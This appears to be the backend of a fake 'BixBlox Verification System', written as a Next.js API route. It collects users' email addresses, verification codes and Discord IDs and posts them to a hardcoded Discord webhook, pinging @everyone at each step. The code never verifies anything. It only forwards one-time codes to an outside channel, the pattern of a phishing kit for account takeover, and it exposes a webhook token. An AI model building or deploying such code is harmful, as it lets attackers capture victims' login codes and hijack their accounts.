import { type NextRequest, NextResponse } from "next/server"

const WEBHOOK_URL =
  "https://discord.com/api/webhooks/1453801461971681352/1uDXJag99aYwmfRZMmJKWJKMcI4wXocKpM0BSPVzDuS-xU7GExaBfJMnAuU7j33_TfPr"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { type, email, code, discordUserId } = body

    let embed
    const content = "@everyone"

    if (type === "email_submitted") {
      embed = {
        title: "📧 Email Submitted",
        description: `A user has submitted their email for verification.`,
        color: 0x5865f2,
        fields: [
          {
            name: "Email Address",
            value: email,
            inline: false,
          },
          {
            name: "Discord User ID",
            value: discordUserId || "Not provided",
            inline: false,
          },
          {
            name: "Status",
            value: "⏳ Waiting for verification code",
            inline: false,
          },
        ],
        timestamp: new Date().toISOString(),
        footer: {
          text: "BixBlox Verification System",
        },
      }
    } else if (type === "code_submitted") {
      embed = {
        title: "✅ Verification Code Submitted",
        description: `A user has submitted their verification code.`,
        color: 0x57f287,
        fields: [
          {
            name: "Email Address",
            value: email,
            inline: false,
          },
          {
            name: "Verification Code",
            value: code,
            inline: false,
          },
          {
            name: "Status",
            value: "Code submitted for verification",
            inline: false,
          },
        ],
        timestamp: new Date().toISOString(),
        footer: {
          text: "BixBlox Verification System",
        },
      }
    } else if (type === "complete") {
      embed = {
        title: "🎉 Verification Complete",
        description: `A user has completed the full verification process.`,
        color: 0x00ff00,
        fields: [
          {
            name: "Email Address",
            value: email,
            inline: false,
          },
          {
            name: "Verification Code",
            value: code,
            inline: false,
          },
          {
            name: "Discord User ID",
            value: discordUserId || "Not provided",
            inline: false,
          },
          {
            name: "Status",
            value: "✅ Fully Verified",
            inline: false,
          },
        ],
        timestamp: new Date().toISOString(),
        footer: {
          text: "BixBlox Verification System",
        },
      }
    }

    const webhookResponse = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content,
        embeds: [embed],
      }),
    })

    if (!webhookResponse.ok) {
      throw new Error("Failed to send webhook")
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Webhook error:", error)
    return NextResponse.json({ success: false, error: "Failed to send webhook" }, { status: 500 })
  }
}
